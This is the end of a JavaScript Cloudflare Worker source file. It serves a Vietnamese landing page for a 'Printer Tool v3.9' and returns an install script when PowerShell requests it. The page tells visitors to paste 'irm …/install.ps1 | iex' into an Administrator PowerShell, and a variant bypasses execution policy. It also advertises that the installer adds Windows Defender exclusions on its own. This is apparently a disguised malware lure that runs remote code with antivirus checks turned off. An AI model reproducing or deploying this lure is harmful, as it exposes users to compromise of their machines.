    <div class="cmd-box-wrap">
      <div class="cmd-tabs">
        <div class="tabs-group">
          <button class="tab-btn active" onclick="switchTab('ps', this)">Windows PowerShell (Khuy\xEAn d\xF9ng)</button>
          <button class="tab-btn" onclick="switchTab('cmd', this)">Command Prompt (CMD)</button>
        </div>
      </div>
      
      <div class="cmd-main-row">
        <div class="cmd-code-block">
          <span class="cmd-prompt">PS C:&gt;</span>
          <span class="cmd-text" id="cmdText">irm https://software.tantai23597.workers.dev/install.ps1 | iex</span>
        </div>
        <div class="cmd-btn-group">
          <button class="action-btn-copy" onclick="copyCommand()">
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            COPY L\u1EC6NH
          </button>
          <a href="#console" class="action-btn-exe" onclick="simulateRun()">\u26A1 CH\u1EA0Y M\xD4 PH\u1ECENG</a>
        </div>
      </div>
    </div>

    <div class="stats-strip">
      <div class="stat-card">
        <div class="stat-val">v3.9 Stable</div>
        <div class="stat-lbl">Phi\xEAn b\u1EA3n hi\u1EC7n t\u1EA1i</div>
      </div>
      <div class="stat-card">
        <div class="stat-val">Win 10/11</div>
        <div class="stat-lbl">H\u1EC7 \u0111i\u1EC1u h\xE0nh t\u01B0\u01A1ng th\xEDch</div>
      </div>
      <div class="stat-card">
        <div class="stat-val">Printer Fix</div>
        <div class="stat-lbl">T\xEDnh n\u0103ng c\u1ED1t l\xF5i</div>
      </div>
      <div class="stat-card">
        <div class="stat-val">1-Click</div>
        <div class="stat-lbl">C\xE0i \u0111\u1EB7t &amp; T\u1EA1o Shortcut</div>
      </div>
    </div>

    <div class="bento-section-title">
      <span>\u2728 T\xEDnh N\u0103ng N\u1ED5i B\u1EADt C\u1EE7a H\u1EC7 Th\u1ED1ng</span>
    </div>

    <div class="bento-grid">
      <div class="bento-item">
        <div class="bento-top">
          <div class="bento-icon">\u26A1</div>
          <span class="bento-pill pill-cyan">CDN SPEED</span>
        </div>
        <div class="bento-h3">GitHub CDN v3.9</div>
        <div class="bento-p">T\u1EA3i tr\u1EF1c ti\u1EBFp file printertool.exe t\u1ED1c \u0111\u1ED9 cao t\u1EEB kho l\u01B0u tr\u1EEF GitHub Releases.</div>
        <ul class="bento-features">
          <li>\u0110\u01B0\u1EDDng d\u1EABn chu\u1EA9n x\xE1c v3.9</li>
          <li>T\u1EF1 \u0111\u1ED9ng gi\u1EA3i n\xE9n &amp; ghi \u0111\xE8</li>
          <li>H\u1ED7 tr\u1EE3 TLS 1.2 &amp; TLS 1.3</li>
        </ul>
      </div>

      <div class="bento-item">
        <div class="bento-top">
          <div class="bento-icon">\u{1F6E1}\uFE0F</div>
          <span class="bento-pill pill-green">DEFENDER SAFE</span>
        </div>
        <div class="bento-h3">T\u1EF1 \u0110\u1ED9ng Th\xEAm Ngo\u1EA1i L\u1EC7</div>
        <div class="bento-p">C\u1EA5u h\xECnh Windows Defender t\u1EF1 \u0111\u1ED9ng lo\u1EA1i tr\u1EEB th\u01B0 m\u1EE5c c\xE0i \u0111\u1EB7t Printer Tool.</div>
        <ul class="bento-features">
          <li>B\u1ECF qua ki\u1EC3m tra th\u01B0 m\u1EE5c LocalAppData</li>
          <li>Th\xEAm ti\u1EBFn tr\xECnh printertool.exe tin c\u1EADy</li>
          <li>Kh\xF4ng c\u1EA7n t\u1EAFt di\u1EC7t virus th\u1EE7 c\xF4ng</li>
        </ul>
      </div>

      <div class="bento-item">
        <div class="bento-top">
          <div class="bento-icon">\u{1F5A5}\uFE0F</div>
          <span class="bento-pill pill-purple">FULL RGB UI</span>
        </div>
        <div class="bento-h3">Giao Di\u1EC7n Terminal S\u1EAFc M\xE0u</div>
        <div class="bento-p">Tr\u1EA3i nghi\u1EC7m giao di\u1EC7n c\xE0i \u0111\u1EB7t d\xF2ng l\u1EC7nh ho\xE0n to\xE0n m\u1EDBi v\u1EDBi hi\u1EC7u \u1EE9ng LED RGB Spectrum.</div>
        <ul class="bento-features">
          <li>Thanh ti\u1EBFn tr\xECnh m\u01B0\u1EE3t m\xE0</li>
          <li>Hi\u1EC3n th\u1ECB t\u1ED1c \u0111\u1ED9 &amp; th\u1EDDi gian th\u1EF1c</li>
          <li>T\u1EF1 \u0111\u1ED9ng t\u1EA1o Desktop Shortcut</li>
        </ul>
      </div>
    </div>

    <div class="console-panel" id="console">
      <div class="console-topbar">
        <div class="mac-dots">
          <div class="mac-dot md-red"></div>
          <div class="mac-dot md-yellow"></div>
          <div class="mac-dot md-green"></div>
        </div>
        <div class="console-info">
          <span>powershell.exe \u2014 Printer Tool v3.9 Terminal</span>
          <span>UTF-8</span>
        </div>
      </div>
      <div class="console-actions-bar">
        <button class="btn-act" onclick="addLog('[*] \u0110ang k\u1EBFt n\u1ED1i m\xE1y ch\u1EE7 GitHub CDN v3.9...', 'c-cyan')">\u{1F50C} K\u1EBFt n\u1ED1i CDN</button>
        <button class="btn-act" onclick="addLog('[OK] T\u1EA3i th\xE0nh c\xF4ng printertool.exe (v3.9)', 'c-green')">\u{1F4E6} Ki\u1EC3m tra g\xF3i</button>
        <button class="btn-act" onclick="addLog('[\u2714] \u0110\xE3 t\u1EA1o icon Shortcut &quot;Printer Tool v3.9&quot; tr\xEAn Desktop!', 'c-purple')">\u{1F5A5}\uFE0F T\u1EA1o Shortcut</button>
        <button class="btn-act" onclick="clearLogs()">\u{1F9F9} X\xF3a log</button>
      </div>
      <div class="console-logs-area" id="logArea">
        <div class="log-line"><span class="log-ts">[12:47:00]</span><span class="log-msg c-cyan">PRINTER TOOL 2026 - FULL LED RGB SPECTRUM EDITION (v3.9) INITIALIZED.</span></div>
        <div class="log-line"><span class="log-ts">[12:47:01]</span><span class="log-msg">Ready for deployment on Windows 10 &amp; 11 architecture.</span></div>
      </div>
    </div>

    <div class="bento-section-title">
      <span>\u2753 C\xE2u H\u1ECFi Th\u01B0\u1EDDng G\u1EB7p</span>
    </div>

    <div class="faq-section">
      <div class="faq-item" onclick="toggleFaq(this)">
        <div class="faq-question">
          <span>L\xE0m th\u1EBF n\xE0o \u0111\u1EC3 ch\u1EA1y l\u1EC7nh c\xE0i \u0111\u1EB7t Printer Tool v3.9?</span>
          <span class="faq-icon">\u25BC</span>
        </div>
        <div class="faq-answer">
          B\u1EA1n ch\u1EC9 c\u1EA7n nh\u1EA5n n\xFAt <strong>"COPY L\u1EC6NH"</strong> \u1EDF tr\xEAn, m\u1EDF Windows PowerShell v\u1EDBi quy\u1EC1n Administrator v\xE0 d\xE1n l\u1EC7nh v\xE0o, sau \u0111\xF3 nh\u1EA5n Enter \u0111\u1EC3 h\u1EC7 th\u1ED1ng t\u1EF1 \u0111\u1ED9ng ho\xE0n t\u1EA5t.
        </div>
      </div>

      <div class="faq-item" onclick="toggleFaq(this)">
        <div class="faq-question">
          <span>Link t\u1EA3i tr\u1EF1c ti\u1EBFp file printertool.exe \u1EDF \u0111\xE2u?</span>
          <span class="faq-icon">\u25BC</span>
        </div>
        <div class="faq-answer">
          B\u1EA1n c\xF3 th\u1EC3 t\u1EA3i tr\u1EF1c ti\u1EBFp b\u1EA3n c\u1EADp nh\u1EADt m\u1EDBi nh\u1EA5t t\u1EA1i: <a href="https://github.com/tantai235/Software/releases/download/3.9/Printer.Tool.V.1.5.exe" target="_blank" style="color: var(--cyan);">GitHub Releases - Printer.Tool.V.1.5.exe</a>.
        </div>
      </div>
    </div>

    <footer class="footer">
      <div>\xA9 2026 Tan Tai Software. All rights reserved.</div>
      <div>Printer Tool v3.9 \u2014 Full LED RGB Spectrum Edition.</div>
    </footer>
  </div>

  <div class="toast-notify" id="toastNotify">
    <span>\u2714 \u0110\xE3 sao ch\xE9p l\u1EC7nh PowerShell v\xE0o b\u1ED9 nh\u1EDB t\u1EA1m!</span>
  </div>

  <script>
    function switchTab(type, button) {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      button.classList.add('active');
      const cmdText = document.getElementById('cmdText');
      if (type === 'ps') {
        cmdText.textContent = "irm https://software.tantai23597.workers.dev/install.ps1 | iex";
      } else {
        cmdText.textContent = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://software.tantai23597.workers.dev/install.ps1 | iex"';
      }
    }
    function copyCommand() {
      const text = document.getElementById('cmdText').textContent;
      navigator.clipboard.writeText(text).then(() => {
        const toast = document.getElementById('toastNotify');
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 2500);
      });
    }
    function addLog(msg, colorClass = '') {
      const area = document.getElementById('logArea');
      const now = new Date().toTimeString().split(' ')[0];
      const line = document.createElement('div');
      line.className = 'log-line';
      line.innerHTML = '<span class="log-ts">[' + now + ']</span><span class="log-msg ' + colorClass + '">' + msg + '</span>';
      area.appendChild(line);
      area.scrollTop = area.scrollHeight;
    }
    function clearLogs() {
      document.getElementById('logArea').innerHTML = '';
    }
    function simulateRun() {
      addLog('[*] \u0110ang kh\u1EDFi t\u1EA1o ti\u1EBFn tr\xECnh c\xE0i \u0111\u1EB7t Printer Tool v3.9...', 'c-cyan');
      setTimeout(function() { addLog('[OK] K\u1EBFt n\u1ED1i m\xE1y ch\u1EE7 GitHub CDN th\xE0nh c\xF4ng (v3.9).', 'c-green'); }, 600);
      setTimeout(function() { addLog('[\u2714] \u0110\xE3 tr\xEDch xu\u1EA5t v\xE0 l\u01B0u printertool.exe v\xE0o th\u01B0 m\u1EE5c LocalAppData.', 'c-purple'); }, 1400);
      setTimeout(function() { addLog('[\u2714] \u0110\xE3 c\u1EA5u h\xECnh ngo\u1EA1i l\u1EC7 Windows Defender th\xE0nh c\xF4ng.', 'c-green'); }, 2100);
      setTimeout(function() { addLog('\u{1F680} HO\xC0N T\u1EA4T! \u0110ang kh\u1EDFi ch\u1EA1y Printer Tool v3.9 v\u1EDBi quy\u1EC1n Admin...', 'c-cyan'); }, 2800);
    }
    function toggleFaq(el) {
      el.classList.toggle('open');
    }
  <\/script>
</body>
</html>
`;
var index_default = {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const userAgent = request.headers.get("user-agent") || "";
    // Windows browsers also contain "Windows" in their User-Agent.
    // Use an explicit script URL, with legacy PowerShell support at the root.
    const isScriptPath = url.pathname === "/install.ps1";
    const isPowerShell = /\b(?:WindowsPowerShell|PowerShell)\b/i.test(userAgent);
    if (isScriptPath || (url.pathname === "/" && isPowerShell)) {
      return new Response(PS1_SCRIPT, {
        headers: {
          "Content-Type": "text/plain; charset=utf-8",
          "Cache-Control": "no-store, no-cache, must-revalidate"
        }
      });
    }
    return new Response(HTML_CONTENT, {
      headers: {
        "Content-Type": "text/html; charset=utf-8",
        "Cache-Control": "no-store"
      }
    });
  }
};
export {
  index_default as default
};
